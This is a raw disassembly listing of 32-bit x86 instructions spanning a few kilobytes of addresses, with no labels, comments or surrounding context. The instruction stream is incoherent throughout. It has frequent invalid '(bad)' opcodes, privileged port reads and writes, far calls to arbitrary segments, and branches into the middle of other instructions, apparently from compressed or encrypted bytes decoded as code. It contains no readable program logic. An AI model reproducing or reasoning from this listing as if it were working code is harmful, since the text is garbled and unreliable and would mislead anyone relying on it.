  41de9c:	call   DWORD PTR [esi+0x7937f877]
  41dea2:	mov    cl,0xaa
  41dea4:	inc    ecx
  41dea5:	push   ds
  41dea6:	test   eax,0x9697b760
  41deab:	xor    eax,0xb3526b16
  41deb0:	xor    BYTE PTR [ebx+0x21],dh
  41deb3:	mov    ah,0x3f
  41deb5:	mov    ebx,?
  41deb7:	ins    BYTE PTR es:[edi],dx
  41deb8:	retf   
  41deb9:	dec    esp
  41deba:	(bad)
  41debf:	rcl    BYTE PTR [edx],0x34
  41dec2:	sbb    al,0xcd
  41dec4:	add    eax,ebp
  41dec6:	inc    esp
  41dec7:	ds ds pusha 
  41deca:	adc    DWORD PTR [ebp+0x3a],0xffffffd1
  41dece:	jne    0x41dec2
  41ded0:	cmp    BYTE PTR [esi],ah
  41ded2:	popa   
  41ded3:	xor    esp,DWORD PTR [eax+0x5f]
  41ded6:	and    dl,BYTE PTR [esi+ecx*4+0x40]
  41deda:	adc    edi,DWORD PTR [edi+0x794362e9]
  41dee0:	pop    edx
  41dee1:	cmp    edx,DWORD PTR [ecx+0x47c53e69]
  41dee7:	lds    ecx,FWORD PTR [edx+0x2f8d20df]
  41deed:	fwait
  41deee:	add    DWORD PTR [ecx],0x13f57a8f
  41def4:	adc    al,0x2e
  41def6:	daa    
  41def7:	retf   
  41def8:	andps  xmm1,XMMWORD PTR [esi]
  41defb:	cs jns 0x41df6b
  41defe:	add    eax,0x6f11eebe
  41df03:	fild   DWORD PTR [ecx]
  41df05:	or     al,0x35
  41df07:	xor    cl,ch
  41df09:	nop
  41df0a:	mov    al,ds:0xbfbf90d1
  41df0f:	fidiv  DWORD PTR [edi]
  41df11:	mov    bl,0xb2
  41df13:	ja     0x41dee5
  41df15:	sti    
  41df16:	jecxz  0x41deeb
  41df18:	daa    
  41df19:	popf   
  41df1a:	jl     0x41dea4
  41df1c:	mov    cl,0x4e
  41df1e:	mov    ah,0xf9
  41df20:	repz aad 0xdc
  41df23:	pop    esp
  41df24:	les    esi,FWORD PTR [esi-0x4f]
  41df27:	out    0x84,al
  41df29:	sbb    DWORD PTR [edi+0x35],esp
  41df2c:	loop   0x41df8b
  41df2e:	(bad)  
  41df30:	and    esi,DWORD PTR [esi-0x13]
  41df33:	xchg   esi,eax
  41df34:	inc    ecx
  41df35:	or     esi,edx
  41df37:	ja     0x41dedc
  41df39:	aas    
  41df3a:	paddd  mm1,mm3
  41df3d:	mov    ecx,0x19a309d3
  41df42:	sbb    dh,bl
  41df44:	push   cs
  41df45:	mov    fs,WORD PTR [ebx-0x65]
  41df48:	test   al,ah
  41df4a:	sbb    eax,0xa1e5e882
  41df4f:	sub    BYTE PTR [ecx],ch
  41df51:	adc    eax,0x7d8daa03
  41df56:	shr    ebp,cl
  41df58:	mov    edx,0xedf1c4cc
  41df5d:	shl    BYTE PTR ds:0xf1d5df9a,0x18
  41df64:	ret    
  41df65:	leave  
  41df66:	call   0xcb39:0x1b74f8c4
  41df6d:	(bad)  
  41df6e:	mov    al,ds:0x3508c760
  41df73:	mov    ebp,0x1792cb4
  41df78:	cmc    
  41df79:	and    al,0x22
  41df7b:	ret    
  41df7c:	mov    ds:0xda7b0956,eax
  41df81:	push   ds
  41df82:	fs dec ecx
  41df84:	xor    DWORD PTR [esi+edi*8+0x498435fc],ebp
  41df8b:	(bad)  
  41df8c:	nop
  41df8d:	sbb    BYTE PTR [edi+0x5f3221aa],bl
  41df93:	popf   
  41df94:	lods   eax,DWORD PTR ds:[esi]
  41df95:	(bad)
  41df98:	(bad)  
  41df99:	ja     0x41e00b
  41df9b:	push   eax
  41df9c:	pop    eax
  41df9d:	pop    esp
  41df9e:	bnd jne 0x41dfb8
  41dfa1:	inc    ebx
  41dfa2:	inc    edi
  41dfa3:	xchg   ecx,eax
  41dfa4:	int3   
  41dfa5:	pop    ds
  41dfa6:	jnp    0x41df32
  41dfa8:	sbb    al,BYTE PTR [ebp-0x6a]
  41dfab:	jp     0x41df5e
  41dfad:	xchg   ebx,eax
  41dfae:	inc    ecx
  41dfaf:	aas    
  41dfb0:	fild   QWORD PTR [ecx+0x2a81a3e9]
  41dfb6:	sub    BYTE PTR ds:0xd92e9c0c,0x7c
  41dfbd:	pop    ebx
  41dfbe:	mov    ds:0x9aea8829,al
  41dfc3:	xchg   esp,eax
  41dfc4:	enter  0xf362,0x0
  41dfc8:	aad    0x5f
  41dfca:	jae    0x41df5b
  41dfcc:	icebp  
  41dfcd:	stc    
  41dfce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfcf:	sbb    edx,edx
  41dfd1:	mov    bl,0xe4
  41dfd3:	cmp    BYTE PTR [ebx+0x429928a0],bl
  41dfd9:	pop    esi
  41dfda:	inc    eax
  41dfdb:	add    DWORD PTR [eax+0x4f250467],edx
  41dfe1:	lahf   
  41dfe2:	dec    ecx
  41dfe3:	jecxz  0x41dfa2
  41dfe5:	inc    ebp
  41dfe6:	nop
  41dfe7:	cmp    eax,0xa355a1a4
  41dfec:	jp     0x41dfdc
  41dfee:	daa    
  41dfef:	out    0xf,eax
  41dff1:	(bad)  
  41dff3:	leave  
  41dff4:	xchg   DWORD PTR [ebx+ecx*2+0x67],ebx
  41dff8:	mov    bl,0xe8
  41dffa:	sbb    al,0x96
  41dffc:	outs   dx,BYTE PTR ds:[esi]
  41dffd:	sbb    BYTE PTR ss:[ebx-0x5a53712a],0x3
  41e005:	mov    al,ds:0x6f3518db
  41e00a:	inc    edx
  41e00b:	pop    esi
  41e00c:	mov    bl,0x22
  41e00e:	lahf   
  41e00f:	cli    
  41e010:	sub    dl,BYTE PTR [edx-0x64638e89]
  41e016:	in     eax,dx
  41e017:	dec    DWORD PTR [ebp+0x675c7278]
  41e01d:	add    DWORD PTR [ecx+eax*4-0x7d],edx
  41e021:	js     0x41e090
  41e023:	aad    0x94
  41e025:	(bad)  
  41e027:	loopne 0x41e013
  41e029:	cwde   
  41e02a:	ror    BYTE PTR [eax+0xe],0x58
  41e02e:	test   DWORD PTR [eax],edi
  41e030:	into   
  41e031:	adc    BYTE PTR [ebx],ch
  41e033:	out    0xe7,al
  41e035:	add    al,0x2c
  41e037:	or     BYTE PTR [ebp-0x5f],bh
  41e03a:	imul   ebp,DWORD PTR [ecx+0x1f6fb38c],0x8c709e07
  41e044:	push   eax
  41e045:	inc    edi
  41e046:	or     al,0xea
  41e048:	les    ebx,FWORD PTR [ecx+0x53]
  41e04b:	push   eax
  41e04c:	adc    cl,cl
  41e04e:	cmp    eax,DWORD PTR [esi-0x5ae6fc5]
  41e054:	scas   eax,DWORD PTR es:[edi]
  41e055:	ror    DWORD PTR [edx+0x1dfa265d],cl
  41e05b:	fidivr DWORD PTR [edx+0x51]
  41e05e:	pop    eax
  41e05f:	int    0x8
  41e061:	xor    eax,0xde5a3829
  41e066:	inc    ecx
  41e067:	dec    ebx
  41e068:	pop    ds
  41e069:	cdq    
  41e06a:	sbb    esi,esp
  41e06c:	loope  0x41e0e7
  41e06e:	or     DWORD PTR [eax-0x49b35b83],esp
  41e074:	and    bl,BYTE PTR [esi-0x17c610e4]
  41e07a:	out    0x9d,al
  41e07c:	add    DWORD PTR [edx-0x67],0x88c89217
  41e083:	and    eax,0x57a968
  41e088:	lods   eax,DWORD PTR ds:[esi]
  41e089:	or     eax,0xe4745844
  41e08e:	int3   
  41e08f:	retf   
  41e090:	adc    DWORD PTR [ebx+0x69f3d538],ebx
  41e096:	loope  0x41e01a
  41e098:	out    0xc1,eax
  41e09a:	xchg   esp,eax
  41e09b:	and    ebx,edi
  41e09d:	or     al,0x4a
  41e09f:	dec    esi
  41e0a0:	iret   
  41e0a1:	js     0x41e06a
  41e0a3:	mov    ah,0xb2
  41e0a5:	add    DWORD PTR [eax+0x630b979a],ebp
  41e0ab:	int    0xef
  41e0ad:	sub    dl,BYTE PTR [esi+0x5d]
  41e0b0:	and    BYTE PTR [ebx],0x19
  41e0b3:	mov    esi,0x8f29bbd8
  41e0b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0b9:	inc    edx
  41e0ba:	add    eax,0xdc5bb00a
  41e0bf:	idiv   DWORD PTR [ebp-0x24b5c8e6]
  41e0c5:	jge    0x41e0b9
  41e0c7:	mov    eax,ds:0x294cfa9d
  41e0cc:	int3   
  41e0cd:	push   edx
  41e0ce:	lea    esi,[edx-0x1e2696e2]
  41e0d4:	push   cs
  41e0d5:	and    eax,0x43182cbe
  41e0da:	fwait
  41e0db:	or     DWORD PTR [ebx+0x64],ebx
  41e0de:	xchg   esp,eax
  41e0df:	push   ecx
  41e0e0:	inc    edx
  41e0e1:	xchg   DWORD PTR [edx-0x7d54476a],esp
  41e0e7:	xchg   ebp,eax
  41e0e8:	int    0x8e
  41e0ea:	jl     0x41e09c
  41e0ec:	jle    0x41e15d
  41e0ee:	sub    al,0x85
  41e0f0:	mov    dh,0xa4
  41e0f2:	add    esi,DWORD PTR [ebx-0xb]
  41e0f5:	iret   
  41e0f6:	adc    al,0x46
  41e0f8:	xchg   edi,eax
  41e0f9:	nop
  41e0fa:	retf   
  41e0fb:	mov    ds:0x495aae69,al
  41e100:	(bad)  
  41e101:	mov    ch,0x39
  41e103:	ror    esp,1
  41e105:	and    DWORD PTR [edx+0x89d05e4],eax
  41e10b:	and    al,0xc3
  41e10d:	mov    dh,0xf3
  41e10f:	jle    0x41e0b3
  41e111:	in     al,dx
  41e112:	fwait
  41e113:	rol    BYTE PTR [eax+0x55],cl
  41e116:	add    esi,esi
  41e118:	push   eax
  41e119:	pushf  
  41e11a:	mov    dl,0x64
  41e11c:	xchg   ebp,eax
  41e11d:	ds jle 0x41e108
  41e120:	outs   dx,BYTE PTR ds:[esi]
  41e121:	test   al,0xea
  41e123:	rcl    DWORD PTR [ebp-0x1166c939],0x72
  41e12a:	pop    eax
  41e12b:	cli    
  41e12c:	iret   
  41e12d:	mov    dh,BYTE PTR [ebp-0x1e]
  41e130:	int    0xb2
  41e132:	rol    DWORD PTR [edx],1
  41e134:	call   0xa8a9:0xf9876f58
  41e13b:	adc    al,0x79
  41e13d:	fiadd  WORD PTR [ecx+ecx*1]
  41e140:	hlt    
  41e141:	push   cs
  41e142:	in     eax,0xd1
  41e144:	aas    
  41e145:	icebp  
  41e146:	sub    eax,0x5905761
  41e14b:	pop    edi
  41e14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e14d:	dec    eax
  41e14e:	dec    ecx
  41e14f:	clc    
  41e150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e151:	int3   
  41e152:	enter  0x75d7,0x70
  41e156:	retf   
  41e157:	icebp  
  41e158:	jae    0x41e0e2
  41e15a:	inc    eax
  41e15b:	mov    edx,0x1fc4444e
  41e160:	mov    ah,0x6c
  41e162:	and    al,0xf5
  41e164:	sub    BYTE PTR [esi+eax*1-0x3b],al
  41e168:	xchg   esp,eax
  41e169:	hlt    
  41e16a:	fstp   TBYTE PTR [ecx+edx*8]
  41e16d:	mov    ecx,0xd6534d59
  41e172:	cmp    DWORD PTR [eax-0x6323e8c3],ebx
  41e178:	outs   dx,DWORD PTR ds:[esi]
  41e179:	shl    edx,cl
  41e17b:	sbb    BYTE PTR [ebp-0x7c],bh
  41e17e:	test   eax,0x1b0b58c2
  41e183:	lea    edi,[edi+0x5c4e9fdc]
  41e189:	cdq    
  41e18a:	cmp    ah,BYTE PTR [ebp+0x3a]
  41e18d:	pop    es
  41e18e:	dec    ebp
  41e18f:	mov    eax,0x35a2abf4
  41e194:	out    dx,al
  41e195:	cmp    DWORD PTR ds:0x8b83f9b7,0x5b9d1576
  41e19f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1a0:	xor    al,0xc5
  41e1a2:	jg     0x41e1b1
  41e1a4:	sbb    edx,DWORD PTR [edi-0x34]
  41e1a7:	imul   ecx,ebp,0x7a75fe2a
  41e1ad:	pop    esp
  41e1ae:	(bad)  
  41e1af:	(bad)  
  41e1b0:	inc    ecx
  41e1b1:	mov    ecx,0x190ff867
  41e1b6:	inc    edi
  41e1b7:	xchg   ebx,eax
  41e1b8:	sbb    cl,BYTE PTR [edx]
  41e1ba:	jge    0x41e235
  41e1bc:	jno    0x41e22e
  41e1be:	pop    esp
  41e1bf:	push   ss
  41e1c0:	ss mov al,0xf0
  41e1c3:	stc    
  41e1c4:	xlat   BYTE PTR ds:[ebx]
  41e1c5:	lds    ebx,FWORD PTR ds:0xf927e151
  41e1cb:	jae    0x41e183
  41e1cd:	add    esi,edx
  41e1cf:	dec    esi
  41e1d0:	dec    esp
  41e1d1:	sub    cl,dh
  41e1d3:	cld    
  41e1d4:	mov    ebx,0xe39bfb57
  41e1d9:	retf   
  41e1da:	mov    cl,0xfe
  41e1dc:	adc    esi,DWORD PTR [edi]
  41e1de:	adc    DWORD PTR [ebx+0x29],ecx
  41e1e1:	sbb    eax,0x8918b190
  41e1e6:	les    ecx,FWORD PTR [ecx*1+0x1cc48af9]
  41e1ed:	std    
  41e1ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1ef:	jmp    0x41e258
  41e1f1:	je     0x41e1b5
  41e1f3:	mov    eax,ds:0xe9c40b5a
  41e1f8:	mov    bh,0x3d
	...
  41e3d2:	scas   eax,DWORD PTR es:[edi]
  41e3d3:	ror    esp,1
  41e3d5:	push   esp
  41e3d6:	(bad)  
  41e3d7:	pop    ebp
  41e3d8:	mov    edi,0x5e13fbfb
  41e3dd:	cmp    DWORD PTR [eax+esi*8-0x1e928ac5],ecx
  41e3e4:	add    DWORD PTR [eax],eax
  41e3e6:	push   ds
  41e3e7:	pop    es
  41e3e8:	add    BYTE PTR [eax],al
  41e3ea:	push   ecx
  41e3eb:	inc    edi
  41e3ec:	pop    ss
  41e3ed:	and    esp,ebx
  41e3ef:	ror    DWORD PTR [ebx+0x73],0xf9
  41e3f3:	or     ecx,ecx
  41e3f5:	inc    ebx
  41e3f6:	jo     0x41e3e2
  41e3f8:	cli    
  41e3f9:	xor    DWORD PTR [edx+0x71],esp
  41e3fc:	mov    edi,0x10a8e39a
  41e401:	xor    eax,0x249e2147
  41e406:	and    al,0xec
  41e408:	fcom   QWORD PTR [eax+0x629f2cc7]
  41e40e:	sub    ebp,DWORD PTR [ebx+ecx*4-0x6a]
  41e412:	push   0x27
  41e414:	xor    ebp,DWORD PTR [esi-0x6487edec]
  41e41a:	arpl   WORD PTR [ecx-0x3e],si
  41e41d:	xchg   edx,eax
  41e41e:	repnz xor BYTE PTR [edi+0x49],ch
  41e422:	pop    ecx
  41e423:	push   ss
  41e424:	pop    edx
  41e425:	js     0x41e40f
  41e427:	jmp    0x41e451
  41e429:	jb     0x41e3cf
  41e42b:	inc    esi
  41e42c:	or     BYTE PTR [esi+0x7b],ah
  41e42f:	aad    0x3e
  41e431:	pop    esi
  41e432:	das    
  41e433:	or     ecx,DWORD PTR [ecx-0x16]
  41e436:	popa   
  41e437:	pop    eax
  41e438:	pop    edi
  41e439:	fcmovne st,st(0)
  41e43b:	not    DWORD PTR [eax]
  41e43d:	push   esi
  41e43e:	cmp    eax,0x586b5c2e
  41e443:	fisttp DWORD PTR [ebp+0x34]
  41e446:	ins    DWORD PTR es:[edi],dx
  41e447:	fwait
  41e448:	pusha  
  41e449:	mov    edi,0x314f06dc
  41e44e:	mov    esi,DWORD PTR [esi-0x92dd8f6]
  41e454:	stc    
  41e455:	add    DWORD PTR ss:[ebx],ecx
  41e458:	hlt    
  41e459:	ins    DWORD PTR es:[edi],dx
  41e45a:	sbb    bh,BYTE PTR [ebx-0x19c2fdad]
  41e460:	bound  ebx,QWORD PTR [ebp-0x394e7c3e]
  41e466:	pop    es
  41e467:	fsubr  DWORD PTR [edx-0x2e]
  41e46a:	jnp    0x41e421
  41e46c:	lock out dx,eax
  41e46e:	xlat   BYTE PTR ds:[ebx]
  41e46f:	fsubrp st(6),st
  41e471:	test   DWORD PTR [ebp-0x27],ebp
  41e474:	xchg   edi,eax
  41e475:	xchg   ecx,eax
  41e476:	xor    BYTE PTR [edx+eax*2],al
  41e479:	pop    edi
  41e47a:	inc    ebp
  41e47b:	sbb    cl,BYTE PTR [edx-0x1aa046b]
  41e481:	shl    DWORD PTR [ebx+0x11],cl
  41e484:	cmp    esi,DWORD PTR [edi]
  41e486:	fbld   TBYTE PTR [ebp+0x75]
  41e489:	push   ecx
  41e48a:	popa   
  41e48b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e48c:	test   dh,dh
  41e48e:	loopne 0x41e469
  41e490:	inc    eax
  41e491:	xor    BYTE PTR [ecx+0x8],dh
  41e494:	and    ah,BYTE PTR [edx+0x47]
  41e497:	das    
  41e498:	or     ebp,DWORD PTR [ecx-0x65]
  41e49b:	pop    edi
  41e49c:	cmp    DWORD PTR [ebx+0x18c09351],0xb94bd5b1
  41e4a6:	push   edx
  41e4a7:	ffree  st(0)
  41e4a9:	ret    
  41e4aa:	(bad)  
  41e4ab:	test   dl,0xe9
  41e4ae:	dec    esp
  41e4af:	mov    ah,0x87
  41e4b1:	dec    edx
  41e4b2:	dec    ecx
  41e4b3:	sub    DWORD PTR [ebx+0x1b9c588b],ebp
  41e4b9:	sbb    al,al
  41e4bb:	loopne 0x41e454
  41e4bd:	push   ds
  41e4be:	inc    eax
  41e4bf:	or     al,0x8b
  41e4c1:	das    
  41e4c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4c3:	inc    esi
  41e4c4:	add    DWORD PTR [eax],edi
  41e4c6:	std    
  41e4c7:	fs mov esi,0x6fb0d238
  41e4cd:	call   FWORD PTR [edi]
  41e4cf:	mov    eax,0x1c15d281
  41e4d4:	pop    es
  41e4d5:	cli    
  41e4d6:	call   FWORD PTR [ebp+0x57]
  41e4d9:	dec    ebx
  41e4da:	jbe    0x41e4b2
  41e4dc:	xchg   ebp,eax
  41e4dd:	inc    edx
  41e4de:	and    dh,BYTE PTR ds:0xf43588b7
  41e4e4:	mov    al,ds:0x7e5c46cd
  41e4e9:	jl     0x41e474
  41e4eb:	adc    esp,DWORD PTR [eax-0x7a]
  41e4ee:	mov    eax,ds:0xb6fc718
  41e4f3:	lock mov edi,ecx
  41e4f6:	ja     0x41e4a6
  41e4f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4f9:	out    0x55,ax
  41e4fc:	or     DWORD PTR [ecx+0x6],ebx
  41e4ff:	jge    0x41e558
  41e501:	arpl   WORD PTR [ebp-0x453365a3],dx
  41e507:	or     BYTE PTR ds:0x41c83f26,dl
  41e50d:	push   edx
  41e50e:	jle    0x41e564
  41e510:	dec    edi
  41e511:	int3   
  41e512:	cmp    BYTE PTR [ebx],cl
  41e514:	(bad)  
  41e515:	xchg   ebx,eax
  41e516:	out    dx,eax
  41e517:	mov    cl,0xe5
  41e519:	mov    eax,0xadd4a8be
  41e51e:	mov    BYTE PTR [ebp+0x51],bl
  41e521:	pop    es
  41e522:	or     edi,DWORD PTR [edx-0x554d48c9]
  41e528:	fisttp DWORD PTR [edi]
  41e52a:	mov    ebp,0x9335ea69
  41e52f:	sahf   
  41e530:	lods   eax,DWORD PTR ds:[esi]
  41e531:	jl     0x41e55e
  41e533:	xchg   ebp,eax
  41e534:	loopne 0x41e5a6
  41e536:	lods   al,BYTE PTR ds:[esi]
  41e537:	hlt    
  41e538:	jae    0x41e557
  41e53a:	or     DWORD PTR [edi],esp
  41e53c:	inc    ebp
  41e53d:	gs loop 0x41e573
  41e540:	adc    eax,0x7879f809
  41e545:	(bad)  
  41e546:	sub    al,0x42
  41e548:	jbe    0x41e59d
  41e54a:	ds out dx,eax
  41e54c:	xor    BYTE PTR [eax+0x174a3f11],al
  41e552:	xor    esp,DWORD PTR [eax]
  41e554:	les    esp,FWORD PTR [ebx-0x51bae0b9]
  41e55a:	xchg   ebx,eax
  41e55b:	in     al,dx
  41e55c:	popa   
  41e55d:	xor    eax,0x4ea6f97d
  41e562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e563:	jne    0x41e5c6
  41e565:	nop
  41e566:	shl    BYTE PTR [ecx],1
  41e568:	push   ebx
  41e569:	out    dx,al
  41e56a:	dec    ebx
  41e56b:	mov    WORD PTR [edi+ecx*8+0x51079cbc],fs
  41e572:	in     al,0x79
  41e574:	xchg   ebp,eax
  41e575:	xor    al,0xfd
  41e577:	shr    edi,1
  41e579:	ret    0xe27b
  41e57c:	(bad)  
  41e57d:	pop    ebp
  41e57e:	adc    al,BYTE PTR [ecx-0x7ab5a85d]
  41e584:	xchg   edx,eax
  41e585:	jnp    0x41e583
  41e587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e588:	into   
  41e589:	inc    edx
  41e58a:	pop    ss
  41e58b:	dec    ebp
  41e58c:	jle    0x41e511
  41e58e:	scas   al,BYTE PTR es:[edi]
  41e58f:	repnz fld QWORD PTR [esi+0x1715e38b]
  41e596:	mov    bl,0x66
  41e598:	xchg   DWORD PTR [ecx+0x54a73c03],ebx
  41e59e:	retf   
  41e59f:	(bad)  
  41e5a0:	jns    0x41e537
  41e5a2:	stc    
  41e5a3:	push   edi
  41e5a4:	xor    al,0xac
  41e5a6:	repnz cmc 
  41e5a8:	sub    ecx,DWORD PTR [esi+0x2221a636]
  41e5ae:	arpl   WORD PTR [edi],si
  41e5b0:	adc    al,cl
  41e5b2:	dec    ebp
  41e5b3:	pusha  
  41e5b4:	xor    eax,0x87509d44
  41e5b9:	hlt    
  41e5ba:	or     eax,0xb06f6e71
  41e5bf:	(bad)  
  41e5c0:	mov    dl,0xf4
  41e5c2:	push   ss
  41e5c3:	inc    edx
  41e5c4:	mov    bl,0x13
  41e5c6:	stos   BYTE PTR es:[edi],al
  41e5c7:	aam    0x81
  41e5c9:	sub    dl,BYTE PTR [ecx-0x1f]
  41e5cc:	xchg   edi,eax
  41e5cd:	add    BYTE PTR [ecx+ebx*8],bh
  41e5d0:	push   0x5e
  41e5d2:	sahf   
  41e5d3:	mov    ebx,0x412ee6b1
  41e5d8:	cmp    eax,0x362166cc
  41e5dd:	sub    eax,0x5a1ab7d8
  41e5e2:	add    eax,0xcc370a4
  41e5e7:	ffree  st(6)
  41e5e9:	push   esp
  41e5ea:	dec    ecx
  41e5eb:	xchg   ebp,eax
  41e5ec:	push   0xf5875862
  41e5f1:	push   esp
  41e5f2:	cmc    
  41e5f3:	inc    eax
  41e5f4:	or     al,0xf0
  41e5f6:	sbb    eax,0x73542cf4
  41e5fb:	xor    al,0xbc
  41e5fd:	dec    ecx
  41e5fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5ff:	mov    ds:0xbecf5269,al
  41e604:	ret    0xafef
  41e607:	mov    esp,esp
  41e609:	loop   0x41e5c7
  41e60b:	and    ax,0xef60
  41e60f:	mov    ebx,0xfffe3c15
  41e614:	push   eax
  41e615:	xor    edi,DWORD PTR [eax+0x1b]
  41e618:	arpl   WORD PTR [ebx-0x29],cx
  41e61b:	(bad)  
  41e61c:	jns    0x41e675
  41e61e:	clc    
  41e61f:	sbb    al,0x69
  41e621:	jge    0x41e60c
  41e623:	push   cs
  41e624:	inc    edi
  41e625:	push   ss
  41e626:	ds jl  0x41e5e7
  41e629:	inc    esp
  41e62a:	xchg   ecx,eax
  41e62b:	dec    ebx
  41e62c:	cld    
  41e62d:	dec    ecx
  41e62e:	loopne 0x41e609
  41e630:	pop    ebx
  41e631:	mov    ch,0x6c
  41e633:	in     eax,dx
  41e634:	out    0xc8,al
  41e636:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41e638:	jnp    0x41e5f7
  41e63a:	loope  0x41e5e9
  41e63c:	loope  0x41e620
  41e63e:	jns    0x41e5f7
  41e640:	dec    ebx
  41e641:	mov    eax,0xd17f4d
  41e646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e647:	test   eax,0xfc8cca49
  41e64c:	lock xchg esp,eax
  41e64e:	outs   dx,DWORD PTR ds:[esi]
  41e64f:	(bad)  
  41e650:	shl    BYTE PTR [edi+ebp*8],cl
  41e653:	ret    
  41e654:	pushf  
  41e655:	dec    eax
  41e656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e657:	out    dx,eax
  41e658:	out    dx,eax
  41e659:	std    
  41e65a:	hlt    
  41e65b:	jl     0x41e6c5
  41e65d:	fimul  WORD PTR [edx-0x33]
  41e660:	mov    dl,0x37
  41e662:	sbb    DWORD PTR [eax+ebx*1],ebp
  41e665:	xchg   ebp,eax
  41e666:	(bad)  
  41e668:	sbb    eax,0xeaeb39a
  41e66d:	sub    esp,DWORD PTR [eax+0x67]
  41e670:	hlt    
  41e671:	mov    esi,0x9ef769c7
  41e676:	add    esp,DWORD PTR [esi-0x38c1090b]
  41e67c:	rcl    cl,0xec
  41e67f:	push   0xffffffd6
  41e681:	test   BYTE PTR [edx+0x70d38ea2],0x30
  41e688:	mov    edi,0xb481172e
  41e68d:	test   eax,0x4be91534
  41e692:	xor    cl,BYTE PTR [ebp-0x1576df0a]
  41e698:	xchg   ebp,eax
  41e699:	aaa    
  41e69a:	xor    eax,0xb86ecb54
  41e69f:	mov    eax,0x9f7ff450
  41e6a4:	inc    eax
  41e6a5:	sub    ch,bl
  41e6a7:	mov    edi,0x552d734d
  41e6ac:	push   ss
  41e6ad:	stc    
  41e6ae:	lods   eax,DWORD PTR ds:[esi]
  41e6af:	jne    0x41e6c8
  41e6b1:	adc    eax,0x15b50d41
  41e6b6:	pop    ss
  41e6b7:	xchg   ecx,eax
  41e6b8:	daa    
  41e6b9:	push   ss
  41e6ba:	inc    ebx
  41e6bb:	or     BYTE PTR [esi-0x4a77c9d2],bl
  41e6c1:	sar    DWORD PTR [edi],1
  41e6c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6c4:	mov    ebx,0xa546f881
  41e6c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6ca:	sar    ebx,0xfc
  41e6cd:	out    0xf0,eax
  41e6cf:	ror    BYTE PTR [ecx],cl
  41e6d1:	clc    
  41e6d2:	jle    0x41e6b8
  41e6d4:	mov    ah,0x6
  41e6d6:	(bad)  
  41e6d7:	addr16 push es
  41e6d9:	push   ebp
  41e6da:	add    edx,0x10
  41e6dd:	pop    ds
  41e6de:	in     al,0xf8
  41e6e0:	loopne 0x41e6ed
  41e6e2:	push   edi
  41e6e3:	ret    
  41e6e4:	xchg   edx,eax
  41e6e5:	push   ebp
  41e6e6:	iret   
  41e6e7:	lahf   
  41e6e8:	mov    ecx,0x418bc62a
  41e6ed:	mov    eax,ds:0xf6b34cb2
  41e6f2:	and    bh,BYTE PTR [esi-0x4eb11c40]
  41e6f8:	int3   
  41e6f9:	dec    ebx
  41e6fa:	xor    eax,0x1233c9d0
  41e6ff:	dec    esp
  41e700:	lea    esp,[esi-0x76fc8b72]
  41e706:	mov    ebx,0x9abb4f9b
  41e70b:	test   DWORD PTR [ebp-0x11],esp
  41e70e:	retf   
  41e70f:	mov    ch,0x8a
  41e711:	add    DWORD PTR [edx],ebp
  41e713:	and    al,0x6f
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	test   eax,0x5ade8d77
  41e71b:	call   0xb542:0xa9374fd9
  41e722:	sub    BYTE PTR [ebp-0x2ed2f9a6],cl
  41e728:	cmp    ecx,ebp
  41e72a:	push   0x4ebaeed3
  41e72f:	in     al,0x8d
  41e731:	ss xor al,0x4
  41e734:	ret    0xa71c
  41e737:	jle    0x41e764
  41e739:	into   
  41e73a:	and    DWORD PTR [esi+0x6a],esi
  41e73d:	in     al,0xd1
  41e73f:	push   es
  41e740:	adc    BYTE PTR [eax+0x78],al
  41e743:	mov    BYTE PTR [esi-0x5ad5df95],ah
  41e749:	div    BYTE PTR [ebx-0xe]
  41e74c:	fdiv   st,st(3)
  41e74e:	retf   0x1ec8
  41e751:	mov    DWORD PTR [ebx-0x67a7cdf6],esp
  41e757:	jae    0x41e75f
  41e759:	lock clc 
  41e75b:	mov    ch,0xf4
  41e75d:	mov    esi,0x39f96075
  41e762:	(bad)  
  41e763:	xchg   esp,eax
  41e764:	ins    DWORD PTR es:[edi],dx
  41e765:	mov    BYTE PTR [ecx+0x7fae5599],ch
  41e76b:	pushf  
  41e76c:	adc    ebx,DWORD PTR [edx]
  41e76e:	jecxz  0x41e7da
  41e770:	mov    esp,0xab9b8a3e
  41e775:	in     eax,dx
  41e776:	or     al,0xf4
  41e778:	mov    cl,0xb
  41e77a:	push   esp
  41e77b:	cwde   
  41e77c:	shl    DWORD PTR [eax+0x1b],0x39
  41e780:	sub    esp,DWORD PTR [ebx-0x67]
  41e783:	jg     0x41e784
  41e785:	popf   
  41e786:	xchg   bh,dh
  41e788:	sar    BYTE PTR [ebp-0xc],1
  41e78b:	not    ah
  41e78d:	repz ror DWORD PTR [edi-0x1],1
  41e791:	ds in  eax,0x39
  41e794:	test   al,0x44
  41e796:	add    BYTE PTR [esp+ecx*4-0x78],ch
  41e79a:	imul   ebx,DWORD PTR [edi-0x70d9895e],0x1e2d823e
  41e7a4:	cs sbb al,0x16
  41e7a7:	push   cs
  41e7a8:	ds sbb al,0xd4
  41e7ab:	ficomp WORD PTR [esi]
  41e7ad:	leave  
  41e7ae:	inc    edx
  41e7af:	les    ebp,FWORD PTR [eax-0x37d7faba]
  41e7b5:	test   al,0xc0
  41e7b7:	ja     0x41e794
  41e7b9:	es gs dec eax
  41e7bc:	popa   
  41e7bd:	mov    ecx,0x311ea763
  41e7c2:	iret   
  41e7c3:	sub    ah,bl
  41e7c5:	jg     0x41e82a
  41e7c7:	ds ror cl,cl
  41e7ca:	cmc    
  41e7cb:	je     0x41e77e
